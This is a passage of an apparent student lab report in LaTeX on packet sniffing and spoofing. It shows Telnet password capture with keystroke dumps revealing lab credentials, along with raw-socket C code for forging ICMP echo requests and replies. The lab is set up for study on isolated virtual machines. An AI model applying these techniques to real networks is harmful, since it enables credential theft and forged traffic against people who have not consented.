\label{fig:portrange}
\end{figure}
\subsubsection{Sniffing Passwords}
\noindent This task will involve using \texttt{sniffex} to capture passwords sent by a user using Telnet. It is known that Telnet transmits authentication details in plaintext and as such is vulnerable to password sniffing. We use three systems in this task, where
\begin{itemize}
\item System 1 is the attacker and has IP address 192.168.43.156. (The NAT adapter is used with the ``bridged'' adapter disabled)
\item System 2 is the user and has IP address 192.168.43.167.
\item System 3 is the server and has IP address 192.168.43.157.
\end{itemize}
For the sniffing program, promiscuous mode is turned back on and the filter is set to ``TCP port 23'' as Telnet uses that port for communication. For reference, the username has been left as the default ``seed'' and the password as ``password''. The number of packets captured have also been increased to \textbf{60} as the default setting is insufficient to capture all the details.\\\\ On packet 15 it is visible that the payload reflects the start of the login prompt, just before the user enters his credentials. Figure \ref{fig:login} shows the data that was transmitted in the packet.
\begin{figure}[H]
\centering
\includegraphics[width=0.7\linewidth]{login}
\caption{Telnet Login Prompt}
\label{fig:login}
\end{figure}
\noindent In the following packets, each key that the user enters is captured in a separate packet. As the amount of information printed is excessive, it has been attached to \hyperref[ch:AppA]{Appendix A} for reference. Packets 1 -- 14 have been omitted as the payload does not contain data that is relevant to this task.\\\\
Packets 17 -- 27 contain the username that is used to login to the system. It is interesting to note that the payload is duplicated in the subsequent packet to inform Terminal to display the entered strokes onto the user's screen. Packet 29 has the payload \texttt{0d 00}, which is the \textit{return/enter} key.\\\\Packets 30 -- 46 contain the password for the Telnet session and the data is not duplicated in subsequent packets as it does not require the password to be displayed on the user's Terminal session. Packet 48 similarly ends with \texttt{0d 00} to denote the end of the password input. The authentication ends with the payload \texttt{0d 0a} which indicates a \textit{line break}.\\\\We know that the authentication is genuine when Telnet displays the ``Welcome Page'' on the user's Terminal screen, which is represented by packets 52 -- 56. Packet 57 indicates that Terminal is waiting for the next inputs from the user.
\subsection{Spoofing}
For this section, we use raw socket programming to allow full control over the packet construction and to insert our arbitrary data into the packet. Using raw sockets require the following four steps:
\begin{enumerate}
\itemsep0em
\item Creating the raw socket
\item Setting socket options
\item Constructing the packets
\item Sending the packets through the raw sockets
\end{enumerate}
Online code\footnote{\href{https://github.com/marktube/Packet-Sniffing-and-spoofing}{Marktube (Github): https://github.com/marktube/Packet-Sniffing-and-spoofing}} with some modifications will be used to perform the spoofing.
\subsubsection{Writing A Spoofing Program}
The code used for this task has been attached to \hyperref[ch:ICMPSpoof]{Appendix B} and has been slightly modified. The program is compiled using the same syntax as the \texttt{sniffex} program.
\begin{verbatim}
$ gcc -Wall -o spoofing spoofing.c -lpcap
\end{verbatim}
Before executing the compiled program, Wireshark is opened to monitor the packets in promiscuous mode. The filter expression is set to ``icmp'' to capture only ICMP packets. The captured packet should display the relevant information that was defined in the C code, such as the spoofed IP addresses, ICMP id and sequence numbers.

\begin{figure}[H]
\centering
\includegraphics[width=0.9\linewidth]{spoofprog}
\caption{Spoofing Packet Sent}
\label{fig:spoofprog}
\end{figure}

\noindent From Figure \ref{fig:spoofprog}, we see that the source IP addresses match those that have been defined in the code. Similarly, the id for our ICMP header is reflected. For the sequence number, 4600 is the decimal number for 0x1234 in Big-Endian and 0x3412 in Little-Endian encoding, which corresponds to our defined value. Drilling down to the details in the ICMP packet, we can see that our packet is valid, especially the checksum.

\begin{figure}[H]
\centering
\includegraphics[width=0.8\linewidth]{icmpanal}
\caption{ICMP Packet Analysis}
\label{fig:icmpanal}
\end{figure}

\subsubsection{Spoof an ICMP Echo Request}
This task will involve sending an ICMP echo request packet to a valid host on the Internet, with the aim of obtaining a reply from the endpoint. Minor changes need to be made to the code, since we would like the ICMP reply to be sent back to us. Hence, the source address will be changed to the VM IP address (192.168.43.156). For the destination IP address, we will be using Google's server IP address as it is convenient (8.8.8.8). The code is compiled again and run.

\begin{figure}[H]
\centering
\includegraphics[width=0.8\linewidth]{icmpreply}
\caption{ICMP Reply}
\label{fig:icmpreply}
\end{figure}

\noindent If the packet is properly formed, a valid reply is expected from the server. Here, the details of the reply packet are similar to our ICMP packet that was sent out. However, it can be noted that the \textit{Type} field in the packet is set to 0 which signifies echo reply. In addition, Wireshark also indicates that the ICMP reply is in response to the ICMP echo packet that was previously sent out and therefore we can conclude that the spoofing was successful.

\begin{figure}[H]
\centering
\includegraphics[width=0.8\linewidth]{icmpreplydetail}
\caption{ICMP Reply Packet Detail}
\label{fig:icmpreplydetail}
\end{figure}
\noindent
\textbf{Problem 4:}\\
Can the IP packet length field be set to an arbitrary value, regardless of how big the actual packet is?\\\\
\textbf{Answer 4:}\\
The length field can be set to an arbitrary value as only the length of the raw socket will be used when sending the data out.\\\\
\textbf{Problem 5:}\\
Does the checksum for the IP header need to be calculated when using raw socket programming.\\\\
\textbf{Answer 5:}\\
Yes, this is because the headers are being manually modified by the user and not by the system and hence the fields must be calulated manually.\\\\
\textbf{Problem 6:}\\
Why is root privilege required to run programs that use raw sockets? Where does the program fail if executed without the root privilege?\\\\
\textbf{Answer 6:}\\
Root privilege is required to use raw sockets because these processes have the ability to create spoofing packets and tamper with the system's ability to automatically fill up the various fields with proper data. If no root privilege is granted to the program, then an exception will be thrown to the user.
\begin{verbatim}
/* Create raw socket:*/
  if ((sd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) {
    perror("raw socket");
    exit(1);
  }
\end{verbatim}
The following is the exception string that will be thrown to the user when executing without root privileges.\\\\
\textit{raw socket: Operation not permitted}

\subsubsection{Spoof Ethernet Frame}
This part will involve spoofing of the frame at the physical layer. The code has been attached to \hyperref[ch:EthSpoof]{Appendix B} for reference with minor edits. This layer is where the MAC address of the source and destination are implemented. To indicate to the system that the Ethernet header has been constructed, the following line is included.
\begin{verbatim}
sd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_IP));
\end{verbatim}
If the spoofing is successful, the packet will be sent out and it will be reflected on Wireshark. On Wireshark, the packet can be found by using the filter expression \texttt{fc} (short for Fibre Channel).

\begin{figure}[H]
\centering
\includegraphics[width=0.9\linewidth]{EtherFrameSpoof}
\caption{Ethernet Frame Spoofing}
\label{fig:etherframespoof}
\end{figure}

\noindent Looking at the packet that was just sent out, the source and destination MAC addresses match those that were programmed into the code. This indicates that the spoofing was successful.

\subsection{Sniffing \& Spoofing}
This task will combine both sniffing and spoofing techniques that were previously used. To perform this task, 2 Virtual Machines are placed on the same LAN network with the following configuration.
\begin{itemize}
\item The attacker has IP address 192.168.43.156
\item The user has IP address 192.168.43.154
\end{itemize}
To simulate the sniffing and spoofing attack, an ICMP request will be sent via the \texttt{ping} command will be used on a non-existing IP address (192.168.42.1) not on the local sub-network. (*IP Addresses 192.168.0.0 -- 192.168.255.255 are designated as private networks and cannot be found anywhere over the Internet). On the attacker's system, the sniffing program is expected to sniff for the ICMP packets (in promiscuous mode) and respond with a ICMP echo reply packet.\\\\The sniffing and spoofing code are effectively merged together and have been provided in \hyperref[ch:SniffSpoof]{Appendix B} with further modifications. To respond only to ICMP packets, there is a need to ensure that the receive packet is ICMP. To do so, we can use an existing implementation on line 261 to check if the protocol is ICMP. If it is, we can execute our ICMP spoofer to create the packet to send out and hence the function call to the spoofer has been added at line 263. \\\\The source and destination IP address of the ICMP echo packet has been passed as we need to know where the reply should be directed to. It is also important to note that the source and destination IP address has to be switched in the reply packet, which has been reflected in lines 343 and 344 (Passing the \texttt{inet\_ntoa} ASCII string into the function will create a problem where the source and the destination IP address are the same. To solve this problem, the entire structure is passed instead).\\\\For the sniffer, we need to ensure that we only analyse packets that are based on the ICMP protocol and from the user. As such, the filter is changed to \texttt{icmp and src host 192.168.43.154}. The destination host is not specified as the reply should work for any host.\\\\If it is successful, then the program will automatically respond with a ICMP echo reply to our user's IP address.
\begin{figure}[H]
\centering
\includegraphics[width=0.9\linewidth]{sniffspoof}
\caption{Successful ICMP Reply}
\label{fig:sniffspoof}
\end{figure}
\noindent From Figure \ref{fig:sniffspoof}, the Wireshark capture log shows that the program has successfully replied the packets that were sent from the user. Furthermore, the sequence and id of the ICMP response matches the echo packets that were sent out.

\newgeometry{left=1.5cm,top=1cm, bottom=2cm,right=1.5cm}
\section{Appendix A}
\label{ch:AppA}
\begin{verbatim}
Packet number 15:
       From: 192.168.43.157
         To: 192.168.43.167
   Protocol: TCP
   Src port: 23
   Dst port: 37570
   Payload (34 bytes):
00000   55 62 75 6e 74 75 20 31  32 2e 30 34 2e 35 20 4c    Ubuntu 12.04.5 L
00016   54 53 0d 0a 75 62 75 6e  74 75 20 6c 6f 67 69 6e    TS..ubuntu login
00032   3a 20                                               : 

Packet number 16:
       From: 192.168.43.167
         To: 192.168.43.157
   Protocol: TCP
   Src port: 37570
   Dst port: 23

Packet number 17:
       From: 192.168.43.167
         To: 192.168.43.157
   Protocol: TCP
   Src port: 37570
   Dst port: 23
   Payload (1 bytes):
00000   73                                                  s

Packet number 18:
       From: 192.168.43.157
         To: 192.168.43.167
   Protocol: TCP
   Src port: 23
   Dst port: 37570
   Payload (1 bytes):
00000   73                                                  s

Packet number 19:
       From: 192.168.43.167
         To: 192.168.43.157
   Protocol: TCP
   Src port: 37570
   Dst port: 23

Packet number 20:
       From: 192.168.43.167
         To: 192.168.43.157
   Protocol: TCP
   Src port: 37570
   Dst port: 23
   Payload (1 bytes):
00000   65                                                  e

Packet number 21:
       From: 192.168.43.157
         To: 192.168.43.167
   Protocol: TCP
   Src port: 23
   Dst port: 37570
   Payload (1 bytes):
00000   65                                                  e

Packet number 22:
       From: 192.168.43.167
         To: 192.168.43.157
   Protocol: TCP
   Src port: 37570
   Dst port: 23

Packet number 23:
       From: 192.168.43.167
         To: 192.168.43.157
   Protocol: TCP
   Src port: 37570
   Dst port: 23
   Payload (1 bytes):
00000   65                                                  e

Packet number 24:
       From: 192.168.43.157
         To: 192.168.43.167
   Protocol: TCP
   Src port: 23
   Dst port: 37570
   Payload (1 bytes):
00000   65                                                  e

Packet number 25:
       From: 192.168.43.167
         To: 192.168.43.157
   Protocol: TCP
   Src port: 37570
   Dst port: 23

Packet number 26:
       From: 192.168.43.167
         To: 192.168.43.157
   Protocol: TCP
   Src port: 37570
   Dst port: 23
   Payload (1 bytes):
00000   64                                                  d

Packet number 27:
       From: 192.168.43.157
         To: 192.168.43.167
   Protocol: TCP
   Src port: 23
   Dst port: 37570
   Payload (1 bytes):
00000   64                                                  d

Packet number 28:
       From: 192.168.43.167
         To: 192.168.43.157
   Protocol: TCP
   Src port: 37570
   Dst port: 23

Packet number 29:
       From: 192.168.43.167
         To: 192.168.43.157
   Protocol: TCP
   Src port: 37570
   Dst port: 23
   Payload (2 bytes):
00000   0d 00                                               ..

Packet number 30:
       From: 192.168.43.157
         To: 192.168.43.167
   Protocol: TCP
   Src port: 23
   Dst port: 37570
   Payload (12 bytes):
00000   0d 0a 50 61 73 73 77 6f  72 64 3a 20                ..Password: 

Packet number 31:
       From: 192.168.43.167
         To: 192.168.43.157
   Protocol: TCP
   Src port: 37570
   Dst port: 23

Packet number 32:
       From: 192.168.43.167
         To: 192.168.43.157
   Protocol: TCP
   Src port: 37570
   Dst port: 23
   Payload (1 bytes):
00000   70                                                  p

Packet number 33:
       From: 192.168.43.157
         To: 192.168.43.167
   Protocol: TCP
   Src port: 23
   Dst port: 37570

Packet number 34:
       From: 192.168.43.167
         To: 192.168.43.157
   Protocol: TCP
   Src port: 37570
   Dst port: 23
   Payload (1 bytes):
00000   61                                                  a

Packet number 35:
       From: 192.168.43.157
         To: 192.168.43.167
   Protocol: TCP
   Src port: 23
   Dst port: 37570

Packet number 36:
       From: 192.168.43.167
         To: 192.168.43.157
   Protocol: TCP
   Src port: 37570
   Dst port: 23
   Payload (1 bytes):
00000   73                                                  s

Packet number 37:
       From: 192.168.43.157
         To: 192.168.43.167
   Protocol: TCP
   Src port: 23
   Dst port: 37570

Packet number 38:
       From: 192.168.43.167
         To: 192.168.43.157
   Protocol: TCP
   Src port: 37570
   Dst port: 23
   Payload (1 bytes):
00000   73                                                  s

Packet number 39:
       From: 192.168.43.157
         To: 192.168.43.167
   Protocol: TCP
   Src port: 23
   Dst port: 37570

Packet number 40:
       From: 192.168.43.167
         To: 192.168.43.157
   Protocol: TCP
   Src port: 37570
   Dst port: 23
   Payload (1 bytes):
00000   77                                                  w

Packet number 41:
       From: 192.168.43.157
         To: 192.168.43.167
   Protocol: TCP
   Src port: 23
   Dst port: 37570

Packet number 42:
       From: 192.168.43.167
         To: 192.168.43.157
   Protocol: TCP
   Src port: 37570
   Dst port: 23
   Payload (1 bytes):
00000   6f                                                  o

Packet number 43:
       From: 192.168.43.157
         To: 192.168.43.167
   Protocol: TCP
   Src port: 23
   Dst port: 37570

Packet number 44:
       From: 192.168.43.167
         To: 192.168.43.157
   Protocol: TCP
   Src port: 37570
   Dst port: 23
   Payload (1 bytes):
00000   72                                                  r

Packet number 45:
       From: 192.168.43.157
         To: 192.168.43.167
   Protocol: TCP
   Src port: 23
   Dst port: 37570

Packet number 46:
       From: 192.168.43.167
         To: 192.168.43.157
   Protocol: TCP
   Src port: 37570
   Dst port: 23
   Payload (1 bytes):
00000   64                                                  d

Packet number 47:
       From: 192.168.43.157
         To: 192.168.43.167
   Protocol: TCP
   Src port: 23
   Dst port: 37570

Packet number 48:
       From: 192.168.43.167
         To: 192.168.43.157
   Protocol: TCP
   Src port: 37570
   Dst port: 23
   Payload (2 bytes):
00000   0d 00                                               ..

Packet number 49:
       From: 192.168.43.157
         To: 192.168.43.167
   Protocol: TCP
   Src port: 23
   Dst port: 37570

Packet number 50:
       From: 192.168.43.157
         To: 192.168.43.167
   Protocol: TCP
   Src port: 23
   Dst port: 37570
   Payload (2 bytes):
00000   0d 0a                                               ..

Packet number 51:
       From: 192.168.43.167
         To: 192.168.43.157
   Protocol: TCP
   Src port: 37647
   Dst port: 23

Packet number 52:
       From: 192.168.43.157
         To: 192.168.43.167
   Protocol: TCP
   Src port: 23
   Dst port: 37647
   Payload (63 bytes):
00000   57 65 6c 63 6f 6d 65 20  74 6f 20 55 62 75 6e 74    Welcome to Ubunt
00016   75 20 31 32 2e 30 34 2e  35 20 4c 54 53 20 28 47    u 12.04.5 LTS (G
00032   4e 55 2f 4c 69 6e 75 78  20 33 2e 35 2e 30 2d 33    NU/Linux 3.5.0-3
00048   37 2d 67 65 6e 65 72 69  63 20 69 36 38 36 29       7-generic i686)

Packet number 53:
       From: 192.168.43.167
         To: 192.168.43.157
   Protocol: TCP
   Src port: 37647
   Dst port: 23

Packet number 54:
       From: 192.168.43.157
         To: 192.168.43.167
   Protocol: TCP
   Src port: 23
   Dst port: 37647
   Payload (632 bytes):
00000   0d 0a 0d 0a 20 2a 20 44  6f 63 75 6d 65 6e 74 61    .... * Documenta
00016   74 69 6f 6e 3a 20 20 68  74 74 70 73 3a 2f 2f 68    tion:  https://h
00032   65 6c 70 2e 75 62 75 6e  74 75 2e 63 6f 6d 2f 0d    elp.ubuntu.com/.
00048   0a 0d 0a 4e 65 77 20 72  65 6c 65 61 73 65 20 27    ...New release '
00064   31 34 2e 30 34 2e 35 20  4c 54 53 27 20 61 76 61    14.04.5 LTS' ava
00080   69 6c 61 62 6c 65 2e 0d  0a 52 75 6e 20 27 64 6f    ilable...Run 'do
00096   2d 72 65 6c 65 61 73 65  2d 75 70 67 72 61 64 65    -release-upgrade
00112   27 20 74 6f 20 75 70 67  72 61 64 65 20 74 6f 20    ' to upgrade to 
00128   69 74 2e 0d 0a 0d 0a 0d  0a 0d 0a 59 6f 75 72 20    it.........Your 
00144   63 75 72 72 65 6e 74 20  48 61 72 64 77 61 72 65    current Hardware
00160   20 45 6e 61 62 6c 65 6d  65 6e 74 20 53 74 61 63     Enablement Stac
00176   6b 20 28 48 57 45 29 20  69 73 20 6e 6f 20 6c 6f    k (HWE) is no lo
00192   6e 67 65 72 20 73 75 70  70 6f 72 74 65 64 0d 0a    nger supported..
00208   73 69 6e 63 65 20 32 30  31 34 2d 30 38 2d 30 37    since 2014-08-07
00224   2e 20 20 53 65 63 75 72  69 74 79 20 75 70 64 61    .  Security upda
00240   74 65 73 20 66 6f 72 20  63 72 69 74 69 63 61 6c    tes for critical
00256   20 70 61 72 74 73 20 28  6b 65 72 6e 65 6c 0d 0a     parts (kernel..
00272   61 6e 64 20 67 72 61 70  68 69 63 73 20 73 74 61    and graphics sta
00288   63 6b 29 20 6f 66 20 79  6f 75 72 20 73 79 73 74    ck) of your syst
00304   65 6d 20 61 72 65 20 6e  6f 20 6c 6f 6e 67 65 72    em are no longer
00320   20 61 76 61 69 6c 61 62  6c 65 2e 0d 0a 0d 0a 46     available.....F
00336   6f 72 20 6d 6f 72 65 20  69 6e 66 6f 72 6d 61 74    or more informat
00352   69 6f 6e 2c 20 70 6c 65  61 73 65 20 73 65 65 3a    ion, please see:
00368   0d 0a 68 74 74 70 3a 2f  2f 77 69 6b 69 2e 75 62    ..http://wiki.ub
00384   75 6e 74 75 2e 63 6f 6d  2f 31 32 30 34 5f 48 57    untu.com/1204_HW
00400   45 5f 45 4f 4c 0d 0a 0d  0a 54 68 65 72 65 20 69    E_EOL....There i
00416   73 20 61 20 67 72 61 70  68 69 63 73 20 73 74 61    s a graphics sta
00432   63 6b 20 69 6e 73 74 61  6c 6c 65 64 20 6f 6e 20    ck installed on 
00448   74 68 69 73 20 73 79 73  74 65 6d 2e 20 41 6e 20    this system. An 
00464   75 70 67 72 61 64 65 20  74 6f 20 61 20 0d 0a 73    upgrade to a ..s
00480   75 70 70 6f 72 74 65 64  20 28 6f 72 20 6c 6f 6e    upported (or lon
00496   67 65 72 20 73 75 70 70  6f 72 74 65 64 29 20 63    ger supported) c
00512   6f 6e 66 69 67 75 72 61  74 69 6f 6e 20 77 69 6c    onfiguration wil
00528   6c 20 62 65 63 6f 6d 65  20 61 76 61 69 6c 61 62    l become availab
00544   6c 65 0d 0a 6f 6e 20 32  30 31 34 2d 30 37 2d 31    le..on 2014-07-1
00560   36 20 61 6e 64 20 63 61  6e 20 62 65 20 69 6e 76    6 and can be inv
00576   6f 6b 65 64 20 62 79 20  72 75 6e 6e 69 6e 67 20    oked by running 
00592   27 75 70 64 61 74 65 2d  6d 61 6e 61 67 65 72 27    'update-manager'
00608   20 69 6e 20 74 68 65 0d  0a 44 61 73 68 2e 0d 0a     in the..Dash...
00624   20 20 20 20 0d 0a 0d 0a                                 ....

Packet number 55:
       From: 192.168.43.167
         To: 192.168.43.157
   Protocol: TCP
   Src port: 37647
   Dst port: 23

Packet number 56:
       From: 192.168.43.157
         To: 192.168.43.167
   Protocol: TCP
   Src port: 23
   Dst port: 37647
   Payload (34 bytes):
00000   5b 30 38 2f 30 34 2f 32  30 31 38 20 30 30 3a 33    [08/04/2018 00:3
00016   36 5d 20 73 65 65 64 40  75 62 75 6e 74 75 3a 7e    6] seed@ubuntu:~
00032   24 20                                               $ 

Packet number 57:
       From: 192.168.43.167
         To: 192.168.43.157
   Protocol: TCP
   Src port: 37647
   Dst port: 23

\end{verbatim}

\newpage
\section{Appendix B}

\subsection{ICMP Spoofing}
\label{ch:ICMPSpoof}
\begin{minted}[linenos,breaklines]{C}
/* Brandon - Fixed ICMP Checksum problem */
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <netdb.h>

#include <sys/types.h>
#include <sys/stat.h>
#include <sys/socket.h>

#include <netinet/in_systm.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <netinet/ip_icmp.h>
#include <netinet/tcp.h>

#include <arpa/inet.h>

#define SRC_ADDR "192.168.142.153"
#define DST_ADDR "172.16.87.254"
#define ICMPID 0xffff
#define ICMPSEQ 0x1234

/* Referenced from https://www.tenouk.com/Module43a.html */
unsigned short csum(unsigned short *buf, int nwords)
{
        unsigned long sum;
        for(sum=0; nwords>0; nwords--)
                sum += *buf++;
        sum = (sum >> 16) + (sum &0xffff);
        sum += (sum >> 16);
        return (unsigned short)(~sum);
}

int main(int argc, char **argv)
{
  struct ip ip;
  struct icmp icmp;
  int sd;
  const int on = 1;
  struct sockaddr_in sin;
  u_char* packet;

  // Allocate some space for our packet:
  packet = (u_char *)malloc(60);
  
  /* IP Layer header construct: Referenced from https://www.tenouk.com/Module42.html */

  ip.ip_hl = 0x5; /* Header length (in 32 bits), 160 bits w/o options: 160/32 */
  ip.ip_v = 0x4;  /* IPv4 */
  ip.ip_tos = 0x0; /* Type of Service */
  ip.ip_len = htons(60); /* Length of entire packet in bytes */
  ip.ip_id = 0; /* Identification field to reassemble fragments of a datagram */
  ip.ip_off = 0x0; /* Fragmentation, set to 0 since no fragments */
  ip.ip_ttl = 64; /* Time To Live */
  ip.ip_p = IPPROTO_ICMP; /* Protocol Number, RFC 1700 */
  ip.ip_sum = 0x0; /* Exclude when calculating checksum first */
  ip.ip_src.s_addr = inet_addr(SRC_ADDR); /* Source IP */
  ip.ip_dst.s_addr = inet_addr(DST_ADDR); /* Destination IP */
  ip.ip_sum = csum((unsigned short *)&ip, sizeof(ip)); /* Checksum calculation */
  memcpy(packet, &ip, sizeof(ip)); /* Copy header into packet */
  
  
  //ICMP header construct, Reference RFC 792
  
  icmp.icmp_type = ICMP_ECHO; /* Type 8 for echo */
  icmp.icmp_code = 0; /* No code for echo/reply, leave as 0 */
  icmp.icmp_id = htons(ICMPID); /* Random identifier to match echos & replies */
  icmp.icmp_seq = htons(ICMPSEQ); /* Random sequence number to match echos & replies */
  icmp.icmp_cksum = 0; /* Exclude when calculating checksum first */
  icmp.icmp_cksum = csum((unsigned short *)&icmp, sizeof(&icmp)); /* Checksum Calculation */
  memcpy(packet + 20, &icmp, 8); /* Append the ICMP header to the packet at offset 20 */
  
  /* Create raw socket:*/
  if ((sd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) {
    perror("raw socket");
    exit(1);
  }
  
  /* Prevent kernel from filling up packet with its information*/
  if (setsockopt(sd, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on)) < 0) {
    perror("setsockopt");
    exit(1);
  }
  
  /* Specify destination in kernel to send the raw datagram. We fill in a struct in_addr with the desired destination IP address and pass this structure to the sendto(2) or sendmsg(2) system calls:*/
  
  memset(&sin, 0, sizeof(sin));
  sin.sin_family = AF_INET;
  sin.sin_addr.s_addr = ip.ip_dst.s_addr;
  
  /*send(2) system call cannot be used as the socket is not a "connected" type of socket. A destination is needed to send the raw IP datagram. sendto(2) and sendmsg(2) system calls are designed to handle this:*/
  if (sendto(sd, packet, 60, 0, (struct sockaddr *)&sin, 
	     sizeof(struct sockaddr)) < 0)  {
    perror("sendto");
    exit(1);
  }
  
  return 0;
}
\end{minted}
\newpage

\restoregeometry
\subsection{Explanation (For Selected Parts) - Appendix A}

Lines 49 -- 60 creates the structure required for the IPv4 header, which is illustrated in the figure below\footnote[1]{\url{https://nmap.org/book/tcpip-ref.html}\label{foot1}}.
		\begin{figure}[H]
			\centering
			\tikzset{>=stealth'}
			\begin{tikzpicture}
			
			\draw (-0.8,0) node[xshift=0cm,yshift=0.3cm,text width=0.7cm, align=left] {Bit\\Offset};
			\draw[line width=0.5mm,fill=black] (-0.02,0.6) -- (-0.02,-10.6);
			\draw (0,0) node[xshift=0.2cm, yshift=0.6cm]{\color{red} 0};
			\draw[line width=0.5mm] (3.2,0.6) -- (3.2,-10.6);
			\draw (3.2,0) node[xshift=0.2cm, yshift=0.6cm]{\color{red} 7};
			\draw[line width=0.5mm] (6.4,0.6) -- (6.4,-10.6);
			\draw (6.4,0) node[xshift=0.3cm, yshift=0.6cm]{\color{red} 15};
			\draw[line width=0.5mm] (9.6,0.6) -- (9.6,-10.6);
			\draw (9.6,0) node[xshift=0.3cm, yshift=0.6cm]{\color{red} 23};
			\draw[line width=0.5mm] (12.82,0.6) -- (12.82,-10.6);
			\draw (12.8,0) node[xshift=0.3cm, yshift=0.6cm]{\color{red} 31};
			
			\draw[line width=0.2mm](0.4,0.2) -- (0.4,-10.2);
			\draw[line width=0.2mm](0.8,0.2) -- (0.8,-10.2);
			\draw[line width=0.2mm](1.2,0.2) -- (1.2,-10.2);
			\draw[line width=0.4mm](1.6,0.35) -- (1.6,-10.35);
			\draw[line width=0.2mm](2,0.2) -- (2,-10.2);
			\draw[line width=0.2mm](2.4,0.2) -- (2.4,-10.2);
			\draw[line width=0.2mm](2.8,0.2) -- (2.8,-10.2);
			
			\draw[line width=0.2mm](3.6,0.2) -- (3.6,-10.2);
			\draw[line width=0.2mm](4,0.2) -- (4,-10.2);
			\draw[line width=0.2mm](4.4,0.2) -- (4.4,-10.2);
			\draw[line width=0.4mm](4.8,0.35) -- (4.8,-10.35);
			\draw[line width=0.2mm](5.2,0.2) -- (5.2,-10.2);
			\draw[line width=0.2mm](5.6,0.2) -- (5.6,-10.2);
			\draw[line width=0.2mm](6,0.2) -- (6,-10.2);
			
			\draw[line width=0.2mm](6.8,0.2) -- (6.8,-10.2);
			\draw[line width=0.2mm](7.2,0.2) -- (7.2,-10.2);
			\draw[line width=0.2mm](7.6,0.2) -- (7.6,-10.2);
			\draw[line width=0.4mm](8,0.35) -- (8,-10.35);
			\draw[line width=0.2mm](8.4,0.2) -- (8.4,-10.2);
			\draw[line width=0.2mm](8.8,0.2) -- (8.8,-10.2);
			\draw[line width=0.2mm](9.2,0.2) -- (9.2,-10.2);
			
			\draw[line width=0.2mm](10,0.2) -- (10,-10.2);
			\draw[line width=0.2mm](10.4,0.2) -- (10.4,-10.2);
			\draw[line width=0.2mm](10.8,0.2) -- (10.8,-10.2);
			\draw[line width=0.4mm](11.2,0.35) -- (11.2,-10.35);
			\draw[line width=0.2mm](11.6,0.2) -- (11.6,-10.2);
			\draw[line width=0.2mm](12,0.2) -- (12,-10.2);
			\draw[line width=0.2mm](12.4,0.2) -- (12.4,-10.2);
			
			\draw[line width=0.5mm] (0,-1.7) -- (-0.5,-1.7);
			\draw (-0.5,-1.7) node[xshift=-0.1cm, yshift=-0.3cm]{\color{red} 32};
			\draw[line width=0.5mm] (0,-3.4) -- (-0.5,-3.4);
			\draw (-0.5,-3.4) node[xshift=-0.1cm, yshift=-0.3cm]{\color{red} 64};
			\draw[line width=0.5mm] (0,-5.1) -- (-0.5,-5.1);
			\draw (-0.5,-5.1) node[xshift=-0.1cm, yshift=-0.3cm]{\color{red} 96};
			\draw[line width=0.5mm] (0,-6.8) -- (-0.5,-6.8);
			\draw (-0.5,-6.8) node[xshift=-0.2cm, yshift=-0.3cm]{\color{red} 128};
			\draw[line width=0.5mm] (0,-8.5) -- (-0.5,-8.5);
			\draw (-0.5,-8.5) node[xshift=-0.2cm, yshift=-0.3cm]{\color{red} 160};
			
			%First Row
			\draw[fill=white!50] (0,0) rectangle node{\footnotesize Version} (1.59,-1.5);
			\draw[fill=white!50] (1.61,0) rectangle node[align=center, text width=1.57cm]{\footnotesize Header\\Length (IHL)} (3.18,-1.5);
			\draw[fill=white!50] (3.22,0) rectangle node[align=center,text width=3.16cm]{\footnotesize Type of\\Service (TOS)} (6.38,-1.5);
			\draw[fill=white!50] (6.42,0) rectangle node{\footnotesize Total Length} (12.8,-1.5);
			
			%Second Row
			\draw[fill=white!50] (0,-1.7) rectangle node{\footnotesize Identification} (6.38,-3.2);
			\draw[fill=white!50] (6.42,-1.7) rectangle node[align=center,text width=1.16cm]{\footnotesize IP\\ Flags} (7.6,-3.2);
			\draw[fill=white!50] (7.6,-1.7) rectangle node{\footnotesize Fragment Offset} (12.8,-3.2);
			
			%Third Row
			\draw[fill=white!50] (0,-3.4) rectangle node[align=center,text width=3.18cm]{\footnotesize Time To\\ Live (TTL)} (3.18,-4.9);
			\draw[fill=white!50] (3.22,-3.4) rectangle node{\footnotesize Protocol} (6.38,-4.9);
			\draw[fill=white!50] (6.42,-3.4) rectangle node{\footnotesize Header Checksum} (12.8,-4.9);
			
			%Fourth Row
			\draw[fill=white!50] (0,-5.1) rectangle node{\footnotesize Source Address} (12.8,-6.6);
			
			%Fifth Row
			\draw[fill=white!50] (0,-6.8) rectangle node{\footnotesize Destination Address}(12.8,-8.3);
			
			%Sixth Row
			\draw[fill=white!50] (0,-8.5) rectangle node{\footnotesize IP Option (variable length, optional)}(12.8,-10);

			\end{tikzpicture}
			\caption{IPv4 Header}
				\label{fig:IPv4Head}
			\end{figure}
			\noindent Extensive information on the IPv4 header and its field definitions can be found on AIT's WordPress site\footnote[2]{\url{https://advancedinternettechnologies.wordpress.com/ipv4-header/}}.\\\\
			Lines 66 -- 71 creates the structure for the ICMP packet header that is relevant to our echo/echo reply, which is illustrated in the figure below. For other ICMP message types, RFC 792 provides the relevant headers required\footnote[3]{\href{https://tools.ietf.org/html/rfc792}{RFC 792}}. 
			\begin{figure}[H]
			\centering
			\tikzset{>=stealth'}
			\begin{tikzpicture}
			\draw (-0.8,0) node[xshift=0cm,yshift=0.3cm,text width=0.7cm, align=left] {Bit\\Offset};
			\draw[line width=0.5mm,fill=black] (-0.02,0.6) -- (-0.02,-5.5);
			\draw (0,0) node[xshift=0.2cm, yshift=0.6cm]{\color{red} 0};
			\draw[line width=0.5mm] (3.2,0.6) -- (3.2,-5.5);
			\draw (3.2,0) node[xshift=0.2cm, yshift=0.6cm]{\color{red} 7};
			\draw[line width=0.5mm] (6.4,0.6) -- (6.4,-5.5);
			\draw (6.4,0) node[xshift=0.3cm, yshift=0.6cm]{\color{red} 15};
			\draw[line width=0.5mm] (9.6,0.6) -- (9.6,-5.5);
			\draw (9.6,0) node[xshift=0.3cm, yshift=0.6cm]{\color{red} 23};
			\draw[line width=0.5mm] (12.82,0.6) -- (12.82,-5.5);
			\draw (12.8,0) node[xshift=0.3cm, yshift=0.6cm]{\color{red} 31};
			
			\draw[line width=0.2mm](0.4,0.2) -- (0.4,-5.1);
			\draw[line width=0.2mm](0.8,0.2) -- (0.8,-5.1);
